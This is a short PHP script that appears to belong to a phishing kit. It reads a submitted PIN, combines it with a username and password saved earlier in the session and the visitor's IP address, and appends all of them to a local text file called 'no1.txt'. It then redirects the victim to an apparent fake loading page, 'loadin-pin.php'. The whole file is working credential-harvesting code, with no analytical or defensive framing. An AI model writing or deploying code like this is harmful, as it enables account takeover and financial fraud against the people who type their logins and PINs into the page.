<?php

session_start();
$ip = getenv("REMOTE_ADDR");

$_SESSION['pin'] = trim($_POST['pin']);
//NOnaME

$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$pin = $_SESSION['pin'];

$fw2 = fopen("no1.txt","a");
        $data= "$ip $user $pass $pin\n";
        fputs($fw2,$data);
        fclose($fw2);

header("Location: loadin-pin.php");

?>